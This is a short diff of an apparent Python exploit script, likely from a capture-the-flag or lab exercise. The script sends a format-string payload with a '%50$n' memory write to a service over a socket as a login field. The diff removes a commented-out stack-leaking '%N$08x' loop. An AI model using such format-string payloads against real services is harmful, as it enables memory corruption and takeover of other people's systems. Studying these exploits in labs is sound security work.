@@ -44,20 +44,10 @@ def main():
 	newlen = 0x06bf - 0x05ff
 	login += "%" + str(newlen) + "x" + "%50$n"
 
-	"""
-	j = 47
-	for i in range(30):
-		login += ".%" + str(j) + "$08x"
-		j += 1
-
-	login += "\n"
-	"""
 
 	sock.send("username " + username)
-
 	sock.send("login " + login)
 	print(sock.recv(1024))
-
 	sock.close()
 
 if __name__ == "__main__":
